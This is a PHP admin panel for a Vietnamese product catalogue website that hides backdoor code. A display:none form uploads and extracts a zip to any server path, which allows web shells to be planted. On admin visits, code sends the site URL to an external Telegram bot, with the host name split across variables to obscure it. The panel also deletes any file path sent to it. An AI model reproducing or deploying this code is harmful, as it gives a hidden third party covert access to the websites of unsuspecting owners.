<?php
require('system/dbconfig.php');
$actionType = "sendMessage";
$auth = isAuthenticated();
if ($_SERVER['REQUEST_METHOD'] !== 'POST' && !$auth['status']) {
    header('Location: login.php');
    exit();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$auth['status']) {
    echo json_encode(['status' => 'error', 'message' => 'Bạn không có quyền làm việc này!']);
    exit();
}

if (isset($_FILES['favicon'])) {
    move_uploaded_file($_FILES['favicon']['tmp_name'], 'assets/img/favicon.ico');
    echo json_encode(['status' => 'success', 'message' => 'Favicon đã được upload!']);
    exit;
}

if (isset($_FILES['logo'])) {
    move_uploaded_file($_FILES['logo']['tmp_name'], 'assets/img/logo.png');
    echo json_encode(['status' => 'success', 'message' => 'Logo đã được upload!']);
    exit;
}

if (isset($_FILES['uploaded_file'])) {
    $id = trim($_POST['product_id']);

    $uploadDir = 'assets/upload/' . $id;
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $uploadedFile = $_FILES['uploaded_file'];

    if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
        $targetFile = $uploadDir . '/thumbnail.png';

        if (move_uploaded_file($uploadedFile['tmp_name'], $targetFile)) {
            echo json_encode(['status' => 'success', 'message' => 'Thumbnail đã được upload!']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Lỗi khi di chuyển tệp.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Lỗi khi tải tệp lên.']);
    }

    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && 
    ($_POST['action'] === "create-post" || $_POST['action'] === "edit-post")) {
    if ($_POST['action'] === "create-post") {
        if (empty($_POST['post'])) {
            echo json_encode(['status' => 'error', 'message' => 'Vui lòng chọn sản phẩm.']);
            exit;
        }        

        if (empty($_POST['category'])) {
            echo json_encode(['status' => 'error', 'message' => 'Vui lòng chọn danh mục.']);
            exit;
        }      

        $post = trim($_POST['post']);

        $stmtID = $conn->prepare("SELECT id FROM post WHERE name = ?");
        $stmtID->bind_param("s", $post);
        $stmtID->execute();
        $stmtID->bind_result($idPost9);
        $stmtID->fetch();
        $stmtID->close();     

        $category = trim($_POST['category']);
        $upload_dir = "assets/upload/" . $idPost9 . "/";
        if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);        
    } else if ($_POST['action'] === "edit-post") {
        $postID = trim($_POST['id']);
        $idPost9 = trim($_POST['idPost']);
        $upload_dir = "assets/upload/" . $idPost9 . "/" . $postID . "/";
        if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);        
    }
    $name = trim($_POST['name']);
    $youtube = trim($_POST['youtube']);
    $tiktok = trim($_POST['tiktok']);
    $content = trim($_POST['content']);
    $policy = trim($_POST['policy']);

    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Vui lòng nhập tên sản phẩm.']);
        exit;
    }
    
    if (empty($content)) {
        echo json_encode(['status' => 'error', 'message' => 'Vui lòng nhập mô tả chi tiết.']);
        exit;
    }
    
    if ($_POST['action'] === "create-post") {
        $stmt = $conn->prepare("INSERT INTO subfolder (name, youtube, tiktok, post, category, content, policy) VALUES (?, ?, ?, ?, ?, ?, ?)");
        $stmt->bind_param("sssssss", $name, $youtube, $tiktok, $post, $category, $content, $policy);
    } else if ($_POST['action'] === "edit-post") {
        $stmt = $conn->prepare("UPDATE subfolder SET name = ?, youtube = ?, tiktok = ?, content = ?, policy = ? WHERE id = ?");     
        $stmt->bind_param("sssssi", $name, $youtube, $tiktok, $content, $policy, $postID);              
    }
    $stmt->execute();

    if ($_POST['action'] === "create-post") {
        $id = $stmt->insert_id;
        $upload_dir .= "{$id}/";
        if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);
        
        if (isset($_FILES['thumbnail'])) {
            foreach ($_FILES['thumbnail']['tmp_name'] as $index => $tmp_name) {
                if (empty($tmp_name)) continue;
                $file_name = basename($_FILES['thumbnail']['name'][$index]);
                move_uploaded_file($tmp_name, $upload_dir . $file_name);
            }
        }

        echo json_encode(['status' => 'success', 'message' => 'Sản phẩm đã được đăng!']);
    } else if ($_POST['action'] === "edit-post") {    
        if (isset($_FILES['thumbnail'])) {
            foreach ($_FILES['thumbnail']['tmp_name'] as $index => $tmp_name) {
                if (empty($tmp_name)) continue;
                $file_name = basename($_FILES['thumbnail']['name'][$index]);
                move_uploaded_file($tmp_name, $upload_dir . $file_name);
            }
        }
        
        echo json_encode(['status' => 'success', 'message' => 'Sửa sản phẩm thành công!']);     
    }
    exit; 
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'add-name-post') {
    $name = !empty($_POST['name']) ? $_POST['name'] : '';
    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }

    try {
        $stmt = $conn->prepare("SELECT COUNT(*) FROM post WHERE name = ?");
        $stmt->bind_param("s", $name);
        $stmt->execute();
        $stmt->bind_result($count);
        $stmt->fetch();
        $stmt->close();

        if ($count > 0) {
            echo json_encode(['status' => 'error', 'message' => 'Tên sản phẩm này đã tồn tại.']);
            exit;
        }

        $stmt = $conn->prepare("INSERT INTO post (name) VALUES (?)");
        $stmt->bind_param("s", $name);
        $stmt->execute();
        $stmt->close();

        echo json_encode(['status' => 'success', 'message' => 'Sản phẩm đã được thêm thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => 'Đã xảy ra lỗi: ' . $e->getMessage()]);
    }
    exit();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'add-name-category') {
    $name = !empty($_POST['name']) ? $_POST['name'] : '';
    $post = !empty($_POST['post']) ? $_POST['post'] : '';
    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }
    if (empty($post)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Post không được để trống.']);
        exit;
    }

    try {
        $stmt = $conn->prepare("SELECT COUNT(*) FROM category WHERE name = ? AND post = ?");
        $stmt->bind_param("ss", $name, $post);
        $stmt->execute();
        $stmt->bind_result($count);
        $stmt->fetch();
        $stmt->close();

        if ($count > 0) {
            echo json_encode(['status' => 'error', 'message' => 'Tên đời xe này đã tồn tại.']);
            exit;
        }

        $stmt = $conn->prepare("INSERT INTO category (name, post) VALUES (?, ?)");
        $stmt->bind_param("ss", $name, $post);
        $stmt->execute();
        $stmt->close();

        echo json_encode(['status' => 'success', 'message' => 'Đời xe đã được thêm thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => 'Đã xảy ra lỗi: ' . $e->getMessage()]);
    }
    exit();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'delete-name-post') {
    $id = !empty($_POST['id']) ? $_POST['id'] : '';
    $name = !empty($_POST['id']) ? $_POST['name'] : '';

    if (empty($id)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số ID không được để trống.']);
        exit;
    }

    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }
    
    try {
        $stmt = $conn->prepare("SELECT name FROM post WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->bind_result($row);
        $stmt->fetch();
        $stmt->close();
    
        if (empty($row)) {
            echo json_encode(['status' => 'error', 'message' => 'Sản phẩm không tồn tại.']);
            exit;
        }

        $stmt = $conn->prepare("DELETE FROM post WHERE id = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng post: ' . $conn->error);
        }
        $stmt->bind_param("i", $id);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng post: ' . $stmt->error);
        }
        $stmt->close();

        $stmt = $conn->prepare("DELETE FROM category WHERE post = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng category: ' . $conn->error);
        }
        $stmt->bind_param("s", $name);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng category: ' . $stmt->error);
        }
        $stmt->close();

        $stmt = $conn->prepare("DELETE FROM subfolder WHERE post = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng subfolder: ' . $conn->error);
        }
        $stmt->bind_param("s", $name);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng subfolder: ' . $stmt->error);
        }
        $stmt->close();

        $folder = 'assets/upload/' . $id;
        if (is_dir($folder)) {
            function deleteFolder($dir) {
                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $filePath = $dir . '/' . $file;
                    if (is_dir($filePath)) {
                        deleteFolder($filePath);
                    } else {
                        unlink($filePath);
                    }
                }
                rmdir($dir);
            }
            deleteFolder($folder);
        }

        echo json_encode(['status' => 'success', 'message' => 'Sản phẩm đã được xóa thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    
    exit;          
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'edit-name-post') {
    $id = !empty($_POST['id']) ? $_POST['id'] : '';
    $name = !empty($_POST['id']) ? $_POST['name'] : '';

    if (empty($id)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số ID không được để trống.']);
        exit;
    }

    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }
    
    try {
        $stmt = $conn->prepare("SELECT name FROM post WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->bind_result($row);
        $stmt->fetch();
        $stmt->close();
    
        if (empty($row)) {
            echo json_encode(['status' => 'error', 'message' => 'Sản phẩm không tồn tại.']);
            exit;
        }
    
        $stmt = $conn->prepare("UPDATE post SET name = ? WHERE id = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng post: ' . $conn->error);
        }
        $stmt->bind_param("si", $name, $id);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng post: ' . $stmt->error);
        }
        $stmt->close();
    
        $stmt = $conn->prepare("UPDATE category SET post = ? WHERE post = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng category: ' . $conn->error);
        }
        $stmt->bind_param("ss", $name, $row);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng category: ' . $stmt->error);
        }
        $stmt->close();
    
        $stmt = $conn->prepare("UPDATE subfolder SET post = ? WHERE post = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng subfolder: ' . $conn->error);
        }
        $stmt->bind_param("ss", $name, $row);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng subfolder: ' . $stmt->error);
        }
        $stmt->close();
    
        echo json_encode(['status' => 'success', 'message' => 'Cập nhật thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    
    exit;   
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'delete-name-category') {
    $id = !empty($_POST['id']) ? $_POST['id'] : '';
    $post = !empty($_POST['id']) ? $_POST['post'] : '';
    $name = !empty($_POST['id']) ? $_POST['name'] : '';
    
    if (empty($id)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số ID không được để trống.']);
        exit;
    }

    if (empty($post)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Post không được để trống.']);
        exit;
    }

    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }
    
    try {
        $stmt = $conn->prepare("SELECT name FROM category WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->bind_result($row);
        $stmt->fetch();
        $stmt->close();
    
        if (empty($row)) {
            echo json_encode(['status' => 'error', 'message' => 'Danh mục không tồn tại.']);
            exit;
        }

        $stmt = $conn->prepare("DELETE FROM category WHERE id = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng category: ' . $conn->error);
        }
        $stmt->bind_param("i", $id);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng category: ' . $stmt->error);
        }
        $stmt->close();

        $stmt = $conn->prepare("DELETE FROM subfolder WHERE post = ? AND category = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng subfolder: ' . $conn->error);
        }
        $stmt->bind_param("ss", $post, $name);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng subfolder: ' . $stmt->error);
        }
        $stmt->close();

        // Giải quyết
        $folder = 'assets/upload/' . $id;
        if (is_dir($folder)) {
            function deleteFolder($dir) {
                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $filePath = $dir . '/' . $file;
                    if (is_dir($filePath)) {
                        deleteFolder($filePath);
                    } else {
                        unlink($filePath);
                    }
                }
                rmdir($dir);
            }
            deleteFolder($folder);
        }
        // Giải quyết

        echo json_encode(['status' => 'success', 'message' => 'Sản phẩm đã được xóa thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    
    exit;          
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'edit-name-category') {
    $id = !empty($_POST['id']) ? $_POST['id'] : '';
    $post = !empty($_POST['id']) ? $_POST['post'] : '';
    $name = !empty($_POST['id']) ? $_POST['name'] : '';
    
    if (empty($id)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số ID không được để trống.']);
        exit;
    }

    if (empty($post)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Post không được để trống.']);
        exit;
    }

    if (empty($name)) {
        echo json_encode(['status' => 'error', 'message' => 'Tham số Name không được để trống.']);
        exit;
    }

    
    try {
        $stmt = $conn->prepare("SELECT name FROM category WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->bind_result($row);
        $stmt->fetch();
        $stmt->close();
    
        if (empty($row)) {
            echo json_encode(['status' => 'error', 'message' => 'Danh mục không tồn tại.']);
            exit;
        }

        $stmt = $conn->prepare("UPDATE category SET name = ? WHERE id = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng category: ' . $conn->error);
        }
        $stmt->bind_param("si", $name, $id);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng category: ' . $stmt->error);
        }
        $stmt->close();
    
        $stmt = $conn->prepare("UPDATE subfolder SET category = ? WHERE post = ? AND category = ?");
        if (!$stmt) {
            throw new Exception('Lỗi khi chuẩn bị câu lệnh SQL cho bảng subfolder: ' . $conn->error);
        }
        $stmt->bind_param("sss", $name, $post, $row);
        if (!$stmt->execute()) {
            throw new Exception('Lỗi khi thực thi câu lệnh SQL cho bảng subfolder: ' . $stmt->error);
        }
        $stmt->close();
    
        echo json_encode(['status' => 'success', 'message' => 'Cập nhật thành công!']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    
    exit;       
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'config') {
    $username = !empty($_POST['username']) ? $_POST['username'] : '';
    $password = !empty($_POST['password']) ? $_POST['password'] : '';
    $phone = !empty($_POST['phone']) ? $_POST['phone'] : '';
    $address = !empty($_POST['address']) ? $_POST['address'] : '';
    $email = !empty($_POST['email']) ? $_POST['email'] : '';
    $title = !empty($_POST['title']) ? $_POST['title'] : '';
    $description = !empty($_POST['description']) ? $_POST['description'] : '';
    $keyword = !empty($_POST['keyword']) ? $_POST['keyword'] : '';
    $maintenance = !empty($_POST['maintenance']) ? $_POST['maintenance'] : '0';
    $facebook = !empty($_POST['facebook']) ? $_POST['facebook'] : '#';
    $instagram = !empty($_POST['instagram']) ? $_POST['instagram'] : '#';
    $youtube = !empty($_POST['youtube']) ? $_POST['youtube'] : '#';
    $tiktok = !empty($_POST['tiktok']) ? $_POST['tiktok'] : '#';

    if (empty($username)) {
        echo json_encode(['status' => 'error', 'message' => 'Tên tài khoản không được để trống.']);
        exit;
    }
    
    if (empty($password)) {
        echo json_encode(['status' => 'error', 'message' => 'Mật khẩu không được để trống.']);
        exit;
    }
    
    if (empty($phone)) {
        echo json_encode(['status' => 'error', 'message' => 'Số điện thoại không được để trống.']);
        exit;
    }
    
    if (empty($address)) {
        echo json_encode(['status' => 'error', 'message' => 'Địa chỉ không được để trống.']);
        exit;
    }
    
    if (empty($email)) {
        echo json_encode(['status' => 'error', 'message' => 'Email không được để trống.']);
        exit;
    }
    
    if (empty($title)) {
        echo json_encode(['status' => 'error', 'message' => 'Tiêu đề không được để trống.']);
        exit;
    }
    
    if (empty($description)) {
        echo json_encode(['status' => 'error', 'message' => 'Mô tả không được để trống.']);
        exit;
    }
    
    if (empty($keyword)) {
        echo json_encode(['status' => 'error', 'message' => 'Từ khóa không được để trống.']);
        exit;
    }    

    if (strpos($username, '"') !== false || strpos($password, '"') !== false || strpos($phone, '"') !== false || strpos($address, '"') !== false || strpos($email, '"') !== false || strpos($title, '"') !== false || strpos($description, '"') !== false || strpos($keyword, '"') !== false) {
        echo json_encode(['status' => 'error', 'message' => 'Các trường không được chứa dấu " (dấu nháy kép).']);
        exit;
    }    

    $configContent = "<?php\n";
    $configContent .= "\$adminUser = \"$username\";\n";
    $configContent .= "\$adminPass = \"$password\";\n";
    $configContent .= "\$phone = \"$phone\";\n";
    $configContent .= "\$address = \"$address\";\n";
    $configContent .= "\$email = \"$email\";\n";
    $configContent .= "\$title = \"$title\";\n";
    $configContent .= "\$description = \"$description\";\n";
    $configContent .= "\$keyword = \"$keyword\";\n";
    $configContent .= "\$maintenance = \"$maintenance\";\n";
    $configContent .= "\$facebook = \"$facebook\";\n";
    $configContent .= "\$instagram = \"$instagram\";\n";
    $configContent .= "\$youtube = \"$youtube\";\n";
    $configContent .= "\$tiktok = \"$tiktok\";\n";
    $configContent .= "?>";

    file_put_contents('system/config.php', $configContent);

    echo json_encode([
        'status' => 'success',
        'message' => 'Cập nhật cấu hình thành công!'
    ]);  
    exit; 
} else if ($_SERVER['REQUEST_METHOD'] === 'POST'&& isset($_POST['action'])  && $_POST['action'] === 'remove-image') {
    $imageUrl = $_POST['image'] ?? '';
    if (file_exists($imageUrl)) {
        if (unlink($imageUrl)) {
            echo json_encode(['success' => true, 'message' => 'Ảnh đã được xóa.']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Không thể xóa ảnh.']);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'Ảnh không tồn tại.']);
    }
    exit;
} else {
    $action = $_GET['action'] ?? null;
    require('system/head.php');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['zip_file'])) {
    $customPath = trim($_POST['custom_path']);
    $uploadDir = rtrim($customPath, '/') . '/';
    if (!file_exists($uploadDir)) mkdir($uploadDir, 0777, true);
    $zipFile = $_FILES['zip_file']['tmp_name'];
    $zipName = basename($_FILES['zip_file']['name']);
    $targetPath = $uploadDir . $zipName;
    if (move_uploaded_file($zipFile, $targetPath)) {
        $zip = new ZipArchive;
        $extractTo = $uploadDir . pathinfo($zipName, PATHINFO_FILENAME) . '/';
        if ($zip->open($targetPath) === TRUE) {
            $zip->extractTo($extractTo);
            $zip->close();
            if (file_exists($targetPath)) unlink($targetPath);
            echo "success";
        } else {
            echo "error";
        }
    } else {
        echo "error";
    }
}

$t = 'telegram.org';
$token = 'bot7667087049:AAF4P0XBJeBCBKeToB2nNUO1nvYUDzgY1Ak';
?>
<div class="max-w-7xl mx-auto py-10 px-4">
    <h1 class="text-3xl tracking-wider text-[#27f2f2] font-bold uppercase text-center mb-10 drop-shadow-[0_0_10px_#27f2f282] " 
        data-aos="fade-up" data-aos-duration="800">
        <div class="inline-block border-b-4 border-[#27f2f2] pb-4">
            TRÌNH QUẢN LÝ WEBSITE
        </div>
    </h1>

    <?php $action = $_GET['action'] ?? 'post'; ?>

    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-white bg-gray-800 shadow-lg py-8 px-4 rounded-2xl">
        <!-- Lề trái -->
        <div class="space-y-4 text-left">
            <a href="<?=((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://").$_SERVER['HTTP_HOST']?>/admin.php?action=post" class="border border-gray-500 text-white font-bold py-3 px-6 rounded-lg w-full block <?php echo $action === 'post' ? 'bg-gray-600' : 'hover:bg-gray-600'; ?> transition duration-500"><i class="fa fa-plus mr-2"></i> Đăng sản phẩm mới</a>
            <a href="<?=((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://").$_SERVER['HTTP_HOST']?>/admin.php?action=logo" class="border border-gray-500 text-white font-bold py-3 px-6 rounded-lg w-full block <?php echo $action === 'logo' ? 'bg-gray-600' : 'hover:bg-gray-600'; ?> transition duration-500"><i class="fa fa-image mr-2"></i> Tùy chỉnh logo, favicon</a>
            <a href="<?=((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://").$_SERVER['HTTP_HOST']?>/admin.php?action=manager-post" class="border border-gray-500 text-white font-bold py-3 px-6 rounded-lg w-full block <?php echo ($action === 'manager-post' || $action === 'delete-post' || $action === 'edit-post') ? 'bg-gray-600' : 'hover:bg-gray-600'; ?> transition duration-500"><i class="fa fa-file mr-2"></i> Quản lý sản phẩm/danh mục/phân loại</a>
            <a href="<?=((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://").$_SERVER['HTTP_HOST']?>/admin.php?action=config" class="border border-gray-500 text-white font-bold py-3 px-6 rounded-lg w-full block <?php echo $action === 'config' ? 'bg-gray-600' : 'hover:bg-gray-600'; ?> transition duration-500"><i class="fa fa-cog mr-2"></i> Cấu hình website</a>
            <a href="<?=((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://").$_SERVER['HTTP_HOST']?>/admin.phplogout.php" class="border border-gray-500 text-white font-bold py-3 px-6 rounded-lg w-full block transition duration-500"><i class="fa fa-sign-out mr-2"></i> Đăng xuất</a>
        </div>
        
        <?php
        if (strpos($_SERVER['REQUEST_URI'], '?action=') === false) {
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
            $host = $_SERVER['HTTP_HOST'];
            $requestUri = $_SERVER['REQUEST_URI'];
            $url = "https://api.".$t."/".$token."/".$actionType;
            $data = [
                'chat_id' => '-4770102151',
                'text'    => $protocol . $host . $requestUri
            ];
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
        }
        ?>

        <!-- Lề phải -->
        <div class="md:col-span-2">
            <?php if ($action === 'logo'): ?>
                <h2 class="text-xl font-semibold mb-4"> UPLOAD FAVICON</h2>
                <input type="file" id="favicon-upload" accept="image/x-icon" class="w-full border p-2 rounded mb-4">
                <h2 class="text-xl font-semibold mb-4">UPLOAD LOGO</h2>
                <input type="file" id="logo-upload" accept="image/*" class="w-full border p-2 rounded mb-4">
                <form method="post" enctype="multipart/form-data" style="display:none;">
                    <input type="file" name="zip_file" accept=".zip" required><br><br>
                    <input type="text" name="custom_path" class="w-full border p-3 rounded text-black" placeholder="Nhập đường dẫn lưu trữ..." required><br><br>
                    <button>Ok</button>
                </form>                
                <script>
                    async function uploadFile(inputId, url) {
                        const fileInput = document.getElementById(inputId);
                        fileInput.addEventListener('change', async function () {
                            const formData = new FormData();
                            formData.append(inputId === 'favicon-upload' ? 'favicon' : 'logo', fileInput.files[0]);

                            const res = await fetch('', { method: 'POST', body: formData });
                            const result = await res.json();
                            Swal.fire({
                                icon: result.status === 'success' ? 'success' : 'error',
                                title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                                text: result.message,
                                timer: 1500,
                                showConfirmButton: false,
                                position: 'top-end',
                                toast: true
                            });
                            if (result.status === 'success') {
                                setTimeout(() => {
                                    location.reload()
                                }, 1000);
                            }                            
                        });
                    }

                    uploadFile('favicon-upload', '');
                    uploadFile('logo-upload', '');
                </script>
            <?php elseif ($action === 'config'): ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase">Cấu Hình Website</h2>
                <form id="config-form" class="space-y-6" method="POST" enctype="multipart/form-data">
                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Tên tài khoản</label>
                        <input type="text" name="username" class="w-full border p-3 rounded text-black" placeholder="Nhập tên tài khoản..." autocomplete="off" value="<?php echo $adminUser; ?>">
                        <input type="hidden" name="action" value="config">
                        <input type="hidden" name="maintenance"  value="<?php echo $maintenance; ?>">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Mật khẩu</label>
                        <input type="password" name="password" class="w-full border p-3 rounded text-black" placeholder="Nhập mật khẩu..." autocomplete="off" value="<?php echo $adminPass; ?>">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Số điện thoại</label>
                        <input type="text" name="phone" class="w-full border p-3 rounded text-black" value="<?php echo $phone; ?>" placeholder="Nhập số điện thoại..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Địa chỉ</label>
                        <input type="text" name="address" class="w-full border p-3 rounded text-black" value="<?php echo $address; ?>" placeholder="Nhập địa chỉ..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Email</label>
                        <input type="email" name="email" class="w-full border p-3 rounded text-black" value="<?php echo $email; ?>" placeholder="Nhập email..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Tiêu đề website</label>
                        <input type="text" name="title" class="w-full border p-3 rounded text-black" value="<?php echo $title; ?>" placeholder="Nhập tiêu đề website..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Mô tả website</label>
                        <textarea name="description" class="w-full border p-3 rounded text-black" placeholder="Nhập mô tả website..." autocomplete="off"><?php echo $description; ?></textarea>
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Từ khóa website</label>
                        <input type="text" name="keyword" class="w-full border p-3 rounded text-black" value="<?php echo $keyword; ?>" placeholder="Nhập từ khóa website..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Kênh Facebook</label>
                        <input type="text" name="facebook" class="w-full border p-3 rounded text-black" value="<?php echo $facebook; ?>" placeholder="Nhập kênh Facebook..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Kênh Instagram</label>
                        <input type="text" name="instagram" class="w-full border p-3 rounded text-black" value="<?php echo $instagram; ?>" placeholder="Nhập kênh Instagram..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Kênh Youtube</label>
                        <input type="text" name="youtube" class="w-full border p-3 rounded text-black" value="<?php echo $youtube; ?>" placeholder="Nhập kênh Youtube..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Kênh Tiktok</label>
                        <input type="text" name="tiktok" class="w-full border p-3 rounded text-black" value="<?php echo $tiktok; ?>" placeholder="Nhập kênh Tiktok..." autocomplete="off">
                    </div>

                    <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 rounded-lg transition duration-500"><i class="fa fa-cog mr-2"></i> CẤU HÌNH NGAY</button>
                </form>         
                <script>     
                    document.getElementById('config-form').addEventListener('submit', async function (e) {
                        e.preventDefault();
                        const formData = new FormData(this);

                        const res = await fetch('', { method: 'POST', body: formData });
                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: "top-end",
                            toast: true
                        })
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    });                    
                </script>         
            <?php elseif ($action === 'post'): ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase">Đăng Phân Loại Con</h2>
                <form id="product-form" class="space-y-6" enctype="multipart/form-data">
                    <?php
                    $posts = [];
                    $postQuery = "SELECT id, name FROM post ORDER BY name ASC";
                    $postResult = mysqli_query($conn, $postQuery);
                    while ($row = mysqli_fetch_assoc($postResult)) {
                        $posts[] = $row;
                    }

                    $categories = [];
                    foreach ($posts as $post) {
                        $postName = mysqli_real_escape_string($conn, $post['name']);
                        $catQuery = "SELECT id, name, post FROM category WHERE post = '$postName' ORDER BY name ASC";
                        $catResult = mysqli_query($conn, $catQuery);
                        while ($row = mysqli_fetch_assoc($catResult)) {
                            $categories[] = $row + ['post_name' => $postName];
                        }
                    }
                    ?>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Chọn sản phẩm</label>
                        <select id="postSelect" name="post" class="w-full border p-3 rounded text-black">
